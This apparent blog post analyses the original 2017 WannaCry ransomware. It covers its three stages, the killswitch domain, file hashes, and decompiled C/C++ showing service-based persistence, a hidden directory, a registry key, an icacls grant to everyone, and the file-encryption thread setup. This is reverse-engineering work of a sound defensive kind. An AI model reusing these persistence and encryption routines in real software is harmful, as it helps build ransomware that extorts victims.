**May 10, 2024**
## Intro
WannaCry is a ransomware that hit the world in May of 2017, utilizing EternalBlue to self propogate throughout the world. It would encrypt files, demanding US $300 to $600 in bitcoin to decrypt the files. The initial attack began on May 12th, which was shut down about 7 hours later with the registration of a domain that triggered the program's killswitch. It's estimated that the attack has affected more than 300,000 computers at the time and totaling up to billions in damage. Since then, a secondary variant has been released. For this analysis, we'll be focusing on the original variant.

## Key Files Involved
1. mssecsvc.exe - dropper and worm
2. taskche.exe - loader
3. t.wnry - encryptor
4. @WannaDecryptor@.exe - decryptor

This analysis will focus on the first three. Here's an overview of the entire program control flow:
![WannaCry Control Flow](https://tyler3412.github.io/tyler-blog-site/blog/Technical/Malware/WannaCry/WannaCry.jpeg "Main")

## mssecsvc.exe
**MD5 Hash: db349b97c37d22f5ea1d1841e3c89eb4**
![mssecsvc Control Flow](https://tyler3412.github.io/tyler-blog-site/blog/Technical/Malware/WannaCry/WannaCry_mssec.png "Stage 1")

Upon first running, mssecsvc.exe reaches out to the domain **http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com**. If it's able to contact this domain, then the malware shuts itself off and doesn't run.

Once we're beyond this point, we get to the real entry. From here, the app is run under two modes:
1. Non-service Mode (which transfers into service mode)
2. Service Mode
#### Non-service Mode
When run under non-service mode, the sample takes the no args path. It first creates a service of itself named **mssecsvc2.0** with the display name **Microsoft Security Center (2.0) Service**, runs it with the argument `-m security`, then closes its handle to hide itself. Next it extracts the resource named 1381 from itself to the file **taskche.exe** and runs that with the argument `/i`. Lastly, it changes to service mode.
#### Service Mode
When running as a service, mssecsvc modifies its configuration to exit silently without the SERVICE_STOPPED state when erroring. It'll then attempt to scan for SMB and run Eternal Blue on any vulnerable system with the connected thread.
#### Relevant Decompiled Code
```C
int non_service_mode()
{
  run_as_service();
  extract_and_run_taskche();
  return 0;
}

int real_entry()
{
  SC_HANDLE v1; // eax
  SC_HANDLE v2; // edi
  SC_HANDLE v3; // eax
  SC_HANDLE v4; // esi
  SERVICE_TABLE_ENTRYA ServiceStartTable; // [esp+0h] [ebp-10h] BYREF
  int v6; // [esp+8h] [ebp-8h]
  int v7; // [esp+Ch] [ebp-4h]

  GetModuleFileNameA(0, FileName, 0x104u);
  if ( *_p___argc() < 2 )
    return non_service_mode();
  v1 = OpenSCManagerA(0, 0, 0xF003Fu);
  v2 = v1;
  if ( v1 )
  {
    v3 = OpenServiceA(v1, ServiceName, 0xF01FFu);
    v4 = v3;
    if ( v3 )
    {
      modify_config(v3, 60);
      CloseServiceHandle(v4);
    }
    CloseServiceHandle(v2);
  }
  ServiceStartTable.lpServiceName = ServiceName;
  ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)auto_exploit_and_replicate;
  v6 = 0;
  v7 = 0;
  return StartServiceCtrlDispatcherA(&ServiceStartTable);
}
```
## taskche.exe
**MD5 Hash: 84c82835a5d21bbcf75a61706d8ab549**
![taskche Control Flow](https://tyler3412.github.io/tyler-blog-site/blog/Technical/Malware/WannaCry/WannaCry_taskche.png "Stage 2")

taskche.exe is the second stage payload of WannaCry. It acts as a secondary dropper and sets up the ransomware for further persistence. It does this by creating a hidden directory, it's name being a randomized string for further hiding. It then creates another copy of itself as well as mssecsvc under randomized names, and copies itself into a registry key. Next, it sets up RSA. 

A set of resources is then extracted from itself, where the file t.wnry is checked to see if it's first 8 bytes contain the string **WANACRY!**. After this, the next 4 bytes are checked to see if they contain the integer 256, reads the next 256 bytes to a key buffer, then skips 4 bytes, stores the next 8 into a variable named dwBytes, and writes the rest to a buffer. The key buffer is then decrypted using the static RSA key. This key is lastly used to extract the final stage payload to a randomized string, but for simplicities sake it'll be called t.wnry.dll.

Here's some of the relevant decompiled code for this second stage payload:
```Cpp
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  char ***v4; // eax
  void *t_wnry_dec; // eax
  _DWORD *v6; // eax
  void (__stdcall *v7)(_DWORD, _DWORD); // eax
  cls_0x4081d8 v9; // [esp+10h] [ebp-6E4h] BYREF
  CHAR Filename[517]; // [esp+4E8h] [ebp-20Ch] BYREF
  __int16 v11; // [esp+6EDh] [ebp-7h]
  char v12; // [esp+6EFh] [ebp-5h]
  int t_wnry_len; // [esp+6F0h] [ebp-4h] BYREF

  Filename[0] = byte_40F910;
  memset(&Filename[1], 0, 0x204u);
  v11 = 0;
  v12 = 0;
  GetModuleFileNameA(0, Filename, 0x208u);
  gen_ran_string(DisplayName);
  if ( *_p___argc() != 2
    || (v4 = _p___argv(), strcmp((*v4)[1], aI)) // compares argument with "/i"
    || !create_and_change_directory(0)
    || (CopyFileA(Filename, FileName, 0), GetFileAttributesA(FileName) == -1)// copies the current file to the newly created directory
    || !start_service_and_get_mutex() )         // starts another copy of itself and acquires a mutex
  {
    if ( strrchr(Filename, 92) )
      *strrchr(Filename, 92) = 0;
    SetCurrentDirectoryA(Filename);
    create_reg_key_for_copy(1);                 // Creates registry key HKEY_LOCAL_MACHINE\Software\WannaCryp0r and sets value to absolute path of taskche.exe
    extract_zip(0, Str);                        // extracts zip file from within
    write_bitcoin_addresses_to_file();          // selects and writes random bitcoin address from one of the extracted files
    run_command(CommandLine, 0, 0);             // sets directory to hidden
    run_command(aIcaclsGrantEve, 0, 0);         // grants everyone the perms F /T /C /Q
    if ( dynamically_load_functions() )
    {
      crypto_instance_constructor(&v9);         // class constructor
      if ( create_crypto_key(&v9, 0, 0, 0) )
      {
        t_wnry_len = 0;
        t_wnry_dec = decrypt_twnry_0(&v9, aTWnry, &t_wnry_len);// parse_twnry
        if ( t_wnry_dec )
        {
          v6 = AttachTWnry(t_wnry_dec, t_wnry_len);// attaches DLL to a running process
          if ( v6 )
          {
            v7 = RunTWnry(v6, TaskStart);       // run twnry
            if ( v7 )
              v7(0, 0);
          }
        }
      }
      crypto_instance_destructor(&v9);          // class destructor
    }
  }
  return 0;
}
```

## t.wnry.dll
**MD5 Hash: f351e1fcca0c4ea05fc44d15a17f8b36**
![Dll Control Flow](https://tyler3412.github.io/tyler-blog-site/blog/Technical/Malware/WannaCry/WannaCry_dll.png "Stage 3")

This is the final stage payload of WannaCry. The DLL starts with changing its working directory to taskche's directory then acquiring a mutex. It then stores the thread user in a variable for later.

Next, it reads c.wnry into a buffer and creates 3 strings: res, pky, and eky. It then acquires two more mutexes and tests then encryption and decryption using pky and dky (loaded from memory). The payload lastly deletes the keys and creates new ones, writing them to a file and destroying them from memory.

With the new keys, it starts 5 threads:
1. Write the time to res and res to a buffer file
2. Validate that the new keys still work
3. Encrypt files and any new drives that are attached with the exception of CD/ROM drives
4. Clean up any files left over from encryption
5. Wait to see if the ransom is paid, if so, clean up and decrypt everything

Last bit of code:
```cpp
int __stdcall TaskStart(HMODULE hModule, int a2)
{
  void *v2; // eax
  void (__thiscall ***v3)(_DWORD, int); // esi
  HANDLE v4; // eax
  HANDLE v5; // eax
  HANDLE v6; // ebx
  HANDLE v7; // eax
  HANDLE v8; // eax
  HANDLE Thread; // esi
  WCHAR Filename[260]; // [esp+10h] [ebp-214h] BYREF
  int v12; // [esp+220h] [ebp-4h]

  if ( a2 || get_mutex() )
    return 0;
  Filename[0] = word_1000D918;
  memset(&Filename[1], 0, 518);
  GetModuleFileNameW(hModule, Filename, 0x103u);
  if ( wcsrchr(Filename, 0x5Cu) )
    *wcsrchr(Filename, 0x5Cu) = 0;
  SetCurrentDirectoryW(Filename);
  if ( !change_working_directory(&unk_1000D958, 1) )
    return 0;
  dword_1000DD94 = get_thread_user();
  if ( !dynamically_load_functions() )
    return 0;
  sprintf(Buffer, "%08X.res", 0);
  sprintf(byte_1000DD24, "%08X.pky", 0);
  sprintf(byte_1000DD58, "%08X.eky", 0);
  if ( get_mutex_0(0) || verify_key(0) )
  {
    Thread = CreateThread(0, 0, wait_for_decryption, 0, 0, 0);
    WaitForSingleObject(Thread, 0xFFFFFFFF);
    CloseHandle(Thread);
    return 0;
  }
  v2 = operator new(0x28u);
  v12 = 0;
  if ( v2 )
    v3 = (void (__thiscall ***)(_DWORD, int))sub_10003A10(v2);
  else
    v3 = 0;
  v12 = -1;
  if ( !v3 || !test_keys(byte_1000DD24, byte_1000DD58) )
    return 0;
  if ( !write_keys_to_file() || dword_1000DC70 )
  {
    DeleteFileA(Buffer);
    memset(&pbBuffer, 0, 0x88u);
    dword_1000DC70 = 0;
    regen_keys(&pbBuffer, 8u);
  }
  destroy_keys_from_memory(v3);
  (**v3)(v3, 1);
  v4 = CreateThread(0, 0, write_time, 0, 0, 0);
  if ( v4 )
    CloseHandle(v4);
  Sleep(0x64u);
  v5 = CreateThread(0, 0, verify_key_works, 0, 0, 0);
  if ( v5 )
    CloseHandle(v5);
  Sleep(0x64u);
  v6 = CreateThread(0, 0, encrypt_files, 0, 0, 0);
  Sleep(0x64u);
  v7 = CreateThread(0, 0, encryption_cleanup, 0, 0, 0);
  if ( v7 )
    CloseHandle(v7);
  Sleep(0x64u);
  v8 = CreateThread(0, 0, wait_for_decryption, 0, 0, 0);
  if ( v8 )
    CloseHandle(v8);
  Sleep(0x64u);
  sub_100057C0();
  if ( v6 )
  {
    WaitForSingleObject(v6, 0xFFFFFFFF);
    CloseHandle(v6);
  }
  return 0;
}
```
